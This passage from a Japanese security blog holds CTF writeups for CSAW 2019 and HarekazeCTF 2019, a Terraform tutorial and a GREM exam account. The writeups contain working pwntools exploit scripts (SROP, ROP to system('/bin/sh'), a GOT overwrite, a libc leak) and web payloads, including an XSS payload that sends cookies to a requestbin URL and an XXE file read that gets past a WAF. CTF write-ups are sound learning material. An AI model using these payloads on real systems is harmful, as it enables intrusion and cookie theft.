payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0</span>) <span style="color:#408080;font-style:italic"># rbp</span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0</span>) <span style="color:#408080;font-style:italic"># </span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0</span>) <span style="color:#408080;font-style:italic"># </span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x3b</span>) <span style="color:#408080;font-style:italic"># rax = 0x3b </span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0</span>) <span style="color:#408080;font-style:italic"># rcx</span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0</span>)   <span style="color:#408080;font-style:italic"># rsp</span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x00400185</span>) <span style="color:#408080;font-style:italic"># rip = syscall</span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x0</span>) <span style="color:#408080;font-style:italic"># eflags</span>
payload <span style="color:#666">&lt;&lt;</span> p16(<span style="color:#666">0x33</span>) <span style="color:#408080;font-style:italic"># cs</span>
payload <span style="color:#666">&lt;&lt;</span> p16(<span style="color:#666">0</span>)
payload <span style="color:#666">&lt;&lt;</span> p16(<span style="color:#666">0</span>)
payload <span style="color:#666">&lt;&lt;</span> p16(<span style="color:#666">0x2b</span>) <span style="color:#408080;font-style:italic"># ss</span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x0</span>) <span style="color:#666">*</span> <span style="color:#666">5</span> <span style="color:#408080;font-style:italic"># err ~ union</span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x0</span>) <span style="color:#666">*</span> <span style="color:#666">8</span> <span style="color:#408080;font-style:italic"># reserved[8]</span>
z<span style="color:#666">.</span>sendline payload
z<span style="color:#666">.</span>interact</code></pre></div></li>
</ul></li>

<li><p><strong>flag{sigrop_pop_pop_pop}</strong></p></li>
</ul>

<h3 id="traveller">traveller</h3>

<ul>
<li>解けなかったのでwriteupを見た</li>
<li>Off-by-oneがあるためHeap問題かと思ったら操作対象のインデックスの入力に負数が入力できるOOB問題</li>

<li><p>編集コマンドで、<code>-50</code> をするとfree@gotを書き換えられたのでこれを使って<code>cat_flag</code>関数に飛ばす</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
<span style="color:#408080;font-style:italic"># coding: ascii-8bit</span>
<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
$z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#666">1003</span>
<span style="color:#408080;font-style:italic">#elf = ELF.new &#34;./traveller&#34;</span>
<span style="color:#408080;font-style:italic">#libc = ELF.new &#34;./libc-2.23.so&#34;</span>
context<span style="color:#666">.</span>log_level <span style="color:#666">=</span> <span style="color:#19177c">:debug</span>
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">z</span>; $z; <span style="color:#008000;font-weight:bold">end</span>
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">add</span>(dist, dest)
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt; &#34;</span>
z<span style="color:#666">.</span>sendline dist<span style="color:#666">.</span>to_s
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
z<span style="color:#666">.</span>sendline dest
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt; &#34;</span>
<span style="color:#008000;font-weight:bold">end</span>
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">change</span>(dist, dest)
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;2&#34;</span>
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
z<span style="color:#666">.</span>sendline dist<span style="color:#666">.</span>to_s
z<span style="color:#666">.</span>send dest
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt; &#34;</span>
<span style="color:#008000;font-weight:bold">end</span>
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">delete</span>(dist)
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;3&#34;</span>
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
z<span style="color:#666">.</span>sendline dist<span style="color:#666">.</span>to_s
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt; &#34;</span>
<span style="color:#008000;font-weight:bold">end</span>
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">check</span>(dist)
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;4&#34;</span>
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt;&#34;</span>
z<span style="color:#666">.</span>sendline dist<span style="color:#666">.</span>to_s
<span style="color:#008000;font-weight:bold">return</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt; &#34;</span>
<span style="color:#008000;font-weight:bold">end</span>
tmp <span style="color:#666">=</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt; &#34;</span>
stack_address <span style="color:#666">=</span> tmp<span style="color:#666">.</span>match(<span style="color:#b68">/.\n(.*) \n\n/</span>)<span style="color:#666">[</span><span style="color:#666">1</span><span style="color:#666">].</span>to_i(<span style="color:#666">16</span>)
add(<span style="color:#666">1</span>, <span style="color:#ba2121">&#34;AAAAAAAA&#34;</span>)
change(<span style="color:#666">-</span><span style="color:#666">50</span>, p64(<span style="color:#666">0x4008b6</span>))
<span style="color:#008000">puts</span> delete(<span style="color:#666">0</span>)</code></pre></div></li>

<li><p><strong>flag{h0pe_y0u_3nj0y_ur_j0urn3y}</strong></p></li>
</ul>

<h2 id="rev">Rev</h2>

<h3 id="beleaf">Beleaf</h3>

<ul>
<li>バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する</li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>

idxs <span style="color:#666">=</span> <span style="color:#666">[</span><span style="color:#666">0x1</span>, <span style="color:#666">0x9</span>, <span style="color:#666">0x11</span>, <span style="color:#666">0x27</span>, <span style="color:#666">0x02</span>, <span style="color:#666">0x00</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x03</span>, <span style="color:#666">0x8</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x9</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x11</span>, <span style="color:#666">0x1</span>, <span style="color:#666">0x3</span>, <span style="color:#666">0x13</span>, <span style="color:#666">0x4</span>, <span style="color:#666">0x3</span>, <span style="color:#666">0x5</span>, <span style="color:#666">0x15</span>, <span style="color:#666">0x2e</span>, <span style="color:#666">0xa</span>, <span style="color:#666">0x3</span>, <span style="color:#666">0xa</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x3</span>, <span style="color:#666">0x1</span>, <span style="color:#666">0x2e</span>, <span style="color:#666">0x16</span>, <span style="color:#666">0x2e</span>, <span style="color:#666">0xa</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x6</span><span style="color:#666">]</span>

flag <span style="color:#666">=</span> <span style="color:#666">[</span><span style="color:#666">0x77</span>, <span style="color:#666">0x66</span>, <span style="color:#666">0x7b</span>, <span style="color:#666">0x5f</span>, <span style="color:#666">0x6e</span>, <span style="color:#666">0x79</span>, <span style="color:#666">0x7d</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x62</span>, <span style="color:#666">0x6c</span>, <span style="color:#666">0x72</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x61</span>, <span style="color:#666">0x65</span>, <span style="color:#666">0x69</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x6f</span>, <span style="color:#666">0x74</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x67</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x75</span><span style="color:#666">].</span>map(<span style="color:#666">&amp;</span><span style="color:#19177c">:chr</span>)

idxs<span style="color:#666">.</span>each <span style="color:#008000;font-weight:bold">do</span> <span style="color:#666">|</span>i<span style="color:#666">|</span>
  <span style="color:#008000">print</span> flag<span style="color:#666">[</span>i<span style="color:#666">]</span>
<span style="color:#008000;font-weight:bold">end</span></code></pre></div>
<ul>
<li><strong>flag{we_beleaf_in_your_re_future}</strong></li>
</ul>

<h2 id="web">Web</h2>

<h3 id="baby-csp">baby csp</h3>

<ul>
<li>CSPが有効なXSS問題

<ul>
<li><code>default-src 'self'; script-src 'self' *.google.com; connect-src *</code></li>
</ul></li>
<li>上記のCSPからJSONPエンドポイントでのXSSを使う

<ul>
<li><a href="https://inside.pixiv.blog/kobo/5137">https://inside.pixiv.blog/kobo/5137</a></li>
</ul></li>
<li>FLAGは、Cookieにあるので、requestbin を使ってPOSTさせるJavaScriptを埋め込む</li>
<li><code>&lt;script src=&quot;https://accounts.google.com/o/oauth2/revoke?callback=navigator.sendBeacon('http://requestbin.net/r/ugix54ug', document.cookie)&quot;&gt;&lt;/script&gt;</code></li>
<li><strong>flag{csp_will_solve_EVERYTHING}</strong></li>
</ul>

<h3 id="unagi">unagi</h3>

<ul>
<li>解けなかったのでwriteupを見た</li>
<li>XMLがアップロードできるので、XXEだとわかるが、WAFがありいくつかのキーワード(ENTITYやSYSTEMなど)が使えない

<ul>
<li>PUBLIC は使えたりした</li>
</ul></li>
<li>結論としては、UTF-8ではなくUTF-16BEでアップロードすればWAFをBypassできるというものだった

<ul>
<li>試してたが、普通にXXEとしてうまくないファイルだったためこの方針を諦めてしまっていたのが解けない原因っぽい</li>
</ul></li>
<li><code>cat x.xml | iconv -f UTF-8 -t UTF-16BE &gt; x_utf-16.xml</code> などで作成してアップロードする
<code>xml
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE root[
&lt;!ENTITY pass SYSTEM &quot;file:///flag.txt&quot;&gt;
]&gt;
&lt;users&gt;
&lt;user&gt;
&lt;username&gt;alice2&lt;/username&gt;
&lt;password&gt;passwd1&lt;/password&gt;
&lt;name&gt;Alice2&lt;/name&gt;
&lt;email&gt;alice2@fakesite.com&lt;/email&gt;
&lt;group&gt;CSAW2019&lt;/group&gt;
&lt;intro&gt;&amp;pass;&lt;/intro&gt;
&lt;/user&gt;
&lt;/users&gt;
</code></li>
<li><strong>flag{n0w_i&rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}</strong></li>
</ul>

  
</article>

<article>
  <header class="Heading">
  <h2 class="Heading-title">
    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/harekazectf2019/" rel="bookmark">HarekazeCTF 2019 writeup</a>
  </h2>
  
  <time datetime="2019-05-19T16:54:53&#43;09:00">
    19 May, 2019
  </time>
  
</header>
  

<h2 id="baby-rop-1">Baby ROP 1</h2>

<ul>
<li>バイナリ中で、<code>system</code> 関数使ってechoしており、Canary等もないBOFが起こるので、<code>pop rdi; ret</code> 使って<code>system(/bin/sh)</code> を呼ぶだけ</li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>

<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>

context<span style="color:#666">.</span>log_level <span style="color:#666">=</span> <span style="color:#19177c">:debug</span>
z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;problem.harekaze.com&#34;</span>, <span style="color:#666">20001</span>

pop_rdi_ret <span style="color:#666">=</span> p64(<span style="color:#666">0x00400683</span>)
<span style="color:#008000">system</span> <span style="color:#666">=</span> p64(<span style="color:#666">0x4005e3</span>)

<span style="color:#800">STDIN</span><span style="color:#666">.</span>gets
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">24</span>
payload <span style="color:#666">&lt;&lt;</span> pop_rdi_ret
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x601048</span>)
payload <span style="color:#666">&lt;&lt;</span> <span style="color:#008000">system</span>

z<span style="color:#666">.</span>sendline payload

z<span style="color:#666">.</span>interact</code></pre></div>
<ul>
<li><strong>HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}</strong></li>
</ul>

<h2 id="baby-rop-2">Baby ROP 2</h2>

<ul>
<li><code>system</code> 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ</li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>

<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>

context<span style="color:#666">.</span>log_level <span style="color:#666">=</span> <span style="color:#19177c">:debug</span>
z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;problem.harekaze.com&#34;</span>, <span style="color:#666">20005</span>
<span style="color:#408080;font-style:italic">#z = Sock.new &#34;localhost&#34;, 9999</span>
elf <span style="color:#666">=</span> <span style="color:#800">ELF</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;./babyrop2&#34;</span>
libc <span style="color:#666">=</span> <span style="color:#800">ELF</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;./libc.so.6&#34;</span>
<span style="color:#408080;font-style:italic">#libc = ELF.new &#34;./mylibc.so.6&#34;</span>

pop_rdi_ret <span style="color:#666">=</span> p64(<span style="color:#666">0x00400733</span>)
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>

payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">40</span>
payload <span style="color:#666">&lt;&lt;</span> pop_rdi_ret
payload <span style="color:#666">&lt;&lt;</span> p64(elf<span style="color:#666">.</span>got<span style="color:#666">[</span><span style="color:#ba2121">&#34;__libc_start_main&#34;</span><span style="color:#666">]</span>)
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x4004f0</span>)
payload <span style="color:#666">&lt;&lt;</span> p64(elf<span style="color:#666">.</span>symbols<span style="color:#666">[</span><span style="color:#ba2121">&#34;main&#34;</span><span style="color:#666">]</span>)
<span style="color:#800">STDIN</span><span style="color:#666">.</span>gets
z<span style="color:#666">.</span>sendline payload

recvlen <span style="color:#666">=</span> <span style="color:#ba2121">&#34;Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span><span style="color:#666">.</span>length
data <span style="color:#666">=</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
<span style="color:#008000">p</span> data
libc_base <span style="color:#666">=</span> u64(data<span style="color:#666">[</span>recvlen, <span style="color:#666">6</span><span style="color:#666">].</span>ljust(<span style="color:#666">8</span>, <span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\x00</span><span style="color:#ba2121">&#34;</span>)) <span style="color:#666">-</span> libc<span style="color:#666">.</span>symbols<span style="color:#666">[</span><span style="color:#ba2121">&#34;__libc_start_main&#34;</span><span style="color:#666">]</span>
libc_magic <span style="color:#666">=</span> libc_base <span style="color:#666">+</span> <span style="color:#666">0xf02a4</span>
<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;libc base 0x%x&#34;</span> <span style="color:#008000">% libc_base
</span><span style="color:#008000">puts </span> <span style="color:#ba2121">&#34;libc magic 0x%x&#34;</span> <span style="color:#008000">% libc_magic
</span><span style="color:#008000">
</span><span style="color:#008000">payload </span> <span style="color:#666">=</span> <span style="color:#ba2121">&#34;B&#34;</span> <span style="color:#666">*</span> <span style="color:#666">40</span>
payload <span style="color:#666">&lt;&lt;</span> p64(libc_magic)
z<span style="color:#666">.</span>sendline payload

z<span style="color:#666">.</span>interact</code></pre></div>
<ul>
<li><strong>HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}</strong></li>
</ul>

<h2 id="login">Login</h2>

<ul>
<li>解けなかった、脆弱性わからず</li>
</ul>

<h2 id="harekaze-note">Harekaze Note</h2>

<ul>
<li>Note の削除時に何も考慮してないため、Heapアドレスのリークやdouble freeができるが、そこから攻撃に繋げられず</li>
</ul>

  
</article>

<article>
  <header class="Heading">
  <h2 class="Heading-title">
    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/terraform_for_conoha/" rel="bookmark">Terraform でConoha のインスタンスを立ててみる</a>
  </h2>
  
  <time datetime="2019-05-18T12:24:26&#43;09:00">
    18 May, 2019
  </time>
  
</header>
  

<h2 id="はじめに">はじめに</h2>

<p>最近(?)、自分の中で触ってみたかった技術の1つにTerraformがある。そこで今回は、Terraform でConoha のインスタンスを立ててみる。自分の中での理解をまとめているので間違いあれば教えてください。</p>

<h2 id="terraform-とは">Terraform とは</h2>

<p>Terraform は、Vagrant などで有名な<a href="https://www.hashicorp.com/">HashiCorp </a>が開発しているツールで、クラウドサービスやOpenStack を対象に、独自の定義ファイルを用いてインスタンスの管理（構築・削除）を行うことができる。定義ファイルには、<code>HCL</code> を用いて主に<code>tf</code> ファイルに記載していく。私の第一印象としては、Ruby のDSL のような雰囲気を感じるが、<code>Vagrantfile</code> ほどRuby 感はない。どちらかというと<code>json</code> などに近い雰囲気だ。</p>

<h2 id="terraform-のインストール">Terraform のインストール</h2>

<p>今回は、MacBook Proで行っているので、<code>brew</code> 経由でインストールする。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ brew install terraform</pre></div>
<p>また、<code>HCL</code>を書いていくためエディタ側にもプラグイン等をインストールしてあげよう。渡しの場合は、Emacsの<code>hcl-mode</code>を導入してみた。</p>

<h2 id="定義ファイルの作成">定義ファイルの作成</h2>

<p>今回は、<code>main.tf</code> というファイル名で以下の内容を作成した。以下の内容は、ほぼ<a href="https://qiita.com/kaminchu/items/d0776c381213d54a3a69">参考記事</a> と同一である。今回は、勉強も兼ねているので、これを丁寧に読み解いていく。<br />
まずはじめに、Provider の設定だ。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">provider &#34;openstack&#34; {
  user_name   = &#34;hgoehoge&#34;
  password    = &#34;hagehage&#34;
  tenant_name = &#34;fugafuga&#34;
  auth_url    = &#34;https://identity.tyo1.conoha.io/v2.0&#34;
}</pre></div>
<p>Provider の設定では、<code>provider</code> キーワードを用いてブロックを定義する。次に、実際のProvider 名を設定するのだが、Conoha がOpenStack を使っているため、Provider に<code>openstack</code> を設定する。ここには、<code>aws</code> や<code>azure</code> といった様々なクラウドサービスなどを指定することができる。今回の<code>openstack</code>の場合は、API用のユーザ名やパスワード、テナントを名、認証用URLを設定する。<br />
次に、Keypairについて見ていく。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">resource &#34;openstack_compute_keypair_v2&#34; &#34;keypair&#34; {
  name       = &#34;terraform-keypair&#34;
  public_key = &#34;ssh-rsa hogehoge&#34;
}</pre></div>
<p>ここでは、構築したインスタンスにssh する際に利用する公開鍵の設定をしている。<code>resource</code> ブロックを用いて、リソースを定義する。<code>resource</code> キーワードの次に、リソースの種類、リソース名を設定する。このブロックの中では、一意に識別するための<code>name</code> や公開鍵を貼り付ける<code>public_key</code> を設定している。</p>

<p>次に、実際にインスタンス自体の設定について見ていく。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">resource &#34;openstack_compute_instance_v2&#34; &#34;basic&#34; {
  name        = &#34;basic&#34;                             # 好きな名前
  image_name  = &#34;vmi-ubuntu-18.04-amd64-20gb&#34;
  flavor_name = &#34;g-512mb&#34;
  key_pair    = &#34;terraform-keypair&#34;
  security_groups = [
    &#34;gncs-ipv4-all&#34;,
  ]
}</pre></div>
<p>こちらも、先程と同様に<code>resource</code> ブロックを使って定義する。インスタンス自体の設定に関しては、<code>openstack_compute_instance_v2</code> で設定できるようだ。<code>image_name</code> や<code>flavor_name</code> は、ConohaのAPIを使って設定できる値がわかるので、その値を設定する。今回は最安値プランのVPS構成だ。また、<code>key_pair</code> には先程定義した<code>name</code> 設定する。最後に、<code>security_groups</code> では、通信許可に関する設定だが、今回はIPv4における全開放を指定している。</p>

<p>今回は、設定ファイルにクレデンシャル情報をハードコードしているが、実際には環境変数で渡したり別ファイルに定義したりなどを行うように注意する。</p>

<h2 id="terraform-の実行">Terraform の実行</h2>

<p>Terraform では、まずはじめに<code>init</code> サブコマンドを実行する。ここで、Provider用のプラグインや各種初期化処理などが走る。次に、<code>plan</code> サブコマンドを用いて、実行計画の作成など実際に行われる処理の確認ができる。そして、<code>apply</code> サブコマンドを用いて、実際に処理を実行させる。また、削除した場合は、<code>destroy</code> サブコマンドを利用する。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ terraform init
...(skip)
$ terraform plan
...(skip)
$ terraform apply</pre></div>
<p><code>apply</code> サブコマンドが成功すると結果が出力されるので、そのIP アドレスに対して、ssh すると構築されたサーバにアクセスできることがわかる。また、ssh が確認できたら<code>destroy</code> サブコマンドを実行してみるとインスタンスが削除されている。ここらへんは、逐次実行しながらConoha のコンパネを見ると具体的なイメージが湧きやすい。</p>

<h2 id="おわりに">おわりに</h2>

<p>今回は、既存の記事を参考にTerraform を使ってConoha にVPSを構築してみた。若干~元記事に騙されて時間をとかしたが、実際に構築することができた。これがあれば、また新しくVPS を立てたいときやイベントを行う際などには便利だと思った。もうちょっと使い道を模索して慣れていきたい。</p>

  
<footer>
  <ul class="Tags">
    
    
    
    <li class="Tags-item u-background">
      <a class="Tags-link u-clickable" href="https://owlinux1000.github.io/blog/tags/terraform/" rel="tag">Terraform</a>
    </li>
    
    
  </ul>
</footer>

</article>

<article>
  <header class="Heading">
  <h2 class="Heading-title">
    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/passed_grem/" rel="bookmark">GIAC Reverse Engineering Malware（GREM）合格体験記</a>
  </h2>
  
  <time datetime="2019-05-03T14:32:45&#43;09:00">
    3 May, 2019
  </time>
  
</header>
  

<h2 id="tl-dr">tl;dr</h2>

<ul>
<li><a href="https://www.giac.org/certification/reverse-engineering-malware-grem">GIAC Reverse Engineering Malware（GREM）</a> に 81.33% で合格した</li>
<li>勉強方法

<ul>
<li>受講したトレーニングのテキストを読み込むのと、演習をすべてやり直す</li>
<li>模擬試験を本番と同様の状況で受ける（紙の辞書やテキストを用意して）</li>
<li>少しでも詰まった概念などについては、ググって知識を補完した</li>
</ul></li>
<li>トレーニング以外の総合計勉強時間は30 ~ 40時間ほど</li>
<li>試験言語は、英語だが英語自体の難易度は高くない

<ul>
<li>よっぽど英語に自信がない限りは、保険のために紙の辞書を持っていくと良い</li>
</ul></li>
</ul>

<h2 id="はじめに">はじめに</h2>

<p>今回GREMと呼ばれるGIACのマルウェア解析系の資格試験を受けてきて、見事81.33%で合格することができた。この資格については、あまり情報を公開できないのだが、触れられる範囲で勉強法など当日までの道のりをメモしておく。私自身、初めてGIACの試験を受けたのだが、あまり事前情報がない(日本国内の)ため、今後受ける人の参考になると嬉しい。</p>

<p>はじめに、この手の話は筆者のスペックを語っておいた方が勉強時間や勉強方法などの参考になると思うので少し触れておく。私は、CTFを通して主にELFファイルの解析等を3年ほどやっているため、普通のx86やamd64のバイナリ(逆アセンブル結果)なら苦じゃなく読むことはできる。しかしながら、PEバイナリなどWindows環境やWin32 API、今流行りのマルウェアやキャンペーンなどについては、ド素人である。マルウェアがどういうレジストリキーを書き込むとか、どんなファイルを作成するとかその手の話題も正直あまり詳しくない。そこで、私は2019年3月にSANS For 610というコースに参加してきた。そのため、何もトレーニングを受けてない人に比べるとかなり優位ではある。このコースでは、主に前述した内容などを学んできた。そのため、当初に比べるとかなりスキルは上がったような気はする。また、英語スキル的には、英語で書かれたドキュメントや技術洋書は苦じゃなく読むことができるが、ちょこちょこ英単語ググりながら読んでるレベルである。正直得意ではない。以上がざっとしたスペックである。</p>

<h2 id="勉強方法">勉強方法</h2>

<p>トレーニングを受講してから、およそ4ヵ月以内に本試験を受けなければならない。社会人2年目になった私は、あまり勉強時間が取れないと思い、このGWに勉強しようと決めてGWに突入した。当初の予定では、このGWに勉強して、受験期限日のギリギリに試験を受ける予定だった。</p>

<p>SANS For610では、5日間にかけて講義を行う。そのため、5つのテキストが手元にはある。そこで、1日1冊を丁寧に復習するようにした。1冊復習するのに、だいたい5,6時間はかかったと思う。テキストの復習では、主にテキストの内容をざーっと眺めつつ、トレーニング中にやっていた演習などをやり直した。しかしながら、バイナリ解析の基本的なところはすでに得意分野だったので、x86アセンブリ自体の話などは斜め読み程度だった。特に苦手なPE周りやマルウェアの特徴的な挙動だったり解析方法、ツールの使い方などに注力した。<a href="https://www.giac.org/certification/reverse-engineering-malware-grem">公式サイト</a>で、試験でどんなことが問われるかなどは書いてあるので、絶対に見るべし。</p>

<p>GIACの試験では、トレーニングテキストを持ち込むことができるため、必要なことをすべて丸暗記する必要はないが、ある程度覚えておいたほうが必要なときに参照するスピードがあがるので良い。また、英語の試験だが、<strong>紙の辞書も持ち込める</strong> ため英語に自信がないなら持ち込んだほうが良い。</p>

<p>すべてのテキストを復習し終えたら、模擬試験を受けた（模擬試験のスコアが73,4%程度だったので、実はこの時かなりスレスレで、内心険しかった。）。模擬試験を受ける際は、<strong>本番と同じ時間、状況で行う</strong>ことをおすすめする。そのため、紙の辞書なども用意して受けた。あまり問題などについては詳しくいえないが、模擬試験を受けると結果が見れるので、そこで苦手分野を特定して、再度その分野を勉強し直した。その際は、最初よりもより丁寧にテキストを読み込んだり、少しでも詰まった単語や挙動、概念などについてはテキストにとどまらずググって知識を補完した。模擬試験ではだいたい試験時間の半分以下で解答し終わっていたので、<strong>本番は丁寧に英文を読み、時間をいっぱい使おう</strong>と決めた。また、私は、模擬試験を受けた翌日に本試験を申し込んでいたので、苦手分野を復習し終えた後は、ひたすら寝る時間が来るまでテキストの精読と疑問点や気になったところの知識の補完に努めた。このフェーズでは、もう演習系はやらなかった。総合計の勉強時間としては、30~40時間ほどはやったと思う。</p>

<h2 id="当日">当日</h2>

<p>当時は、朝起きてすぐに昨日の復習をして、試験開始の1時間前ぐらいに試験会場に向かった。事前に本人確認などの手続きがあるため、最低でも15分前に来いと書かれていた。持ち物としては、私が受けた試験会場（もしくはGIAC）では、顔写真付きの公的証明書系が2つ必要だったので、パスポートとマイナンバーカードを持っていた。また、試験予約したときのメールも印刷しろと書かれていたので、持っていった。<strong>正直ここらへんは、人の記事読むよりはちゃんと自分で現時点で必要なものを確認する</strong>ことをおすすめする。その他、トレーニングテキスト一式と紙の英和辞典を持っていた。</p>

<h2 id="試験中">試験中</h2>

<p>パソコンでぽちぽちやるのだが、トレーニングテキストを持ち込むとやたらと机が狭くなり難しかった。それに加え辞書などを持ち込んでいると机が狭く圧迫感を感じるので気をつけてほしい。試験中は、ひたすら問題解くのとテキストや紙の辞書をめくりまくった記憶がある。私の場合は、模擬試験でかなり時間が余っていたので、すぐに答えがわかっても再度テキストを見直して本当にあってるかなどを再確認したりして解いていった。これでケアレスミスを防げたので、この作業が合否を分けたと思う。結果として、1時間30程度で本試験を終えた。また、本試験の特徴として、わからない問題など後で見返すために問題をスキップできるのだが、結局10問ほどはそれをやって最後に解いた。定期的に、「あーこの話どこかで見たけどテキストで見つからねぇ・・・」みたいなのがやってくるから、そういいった問題はすぐにスキップした。最終問題を解き終えると、その場で合否がわかる。そのため、「この問題があってれば合格できる！」といった願掛けみたいなことを脳内で思って答えた。最終問題を答え、出てきた画面には、合格を表す文章が現れていた。やったぜ。</p>

<h2 id="やっておけばよかったこと">やっておけばよかったこと</h2>

<p>合格しておいてアレだが、個人的にやっておけばよかったことを箇条書きでまとめておく。</p>

<ul>
<li>もっと詳細にテキストを読み込む</li>
<li>テキストだけでとどまらず用語や挙動などをインターネットで調べる</li>
<li>英語の勉強

<ul>
<li>文意が読み取りにくいことがあり、何を問われているか若干わからず時間を溶かした</li>
</ul></li>
<li>紙の辞書をめくる練習

<ul>
<li>久しぶりで結構もたついた</li>
</ul></li>
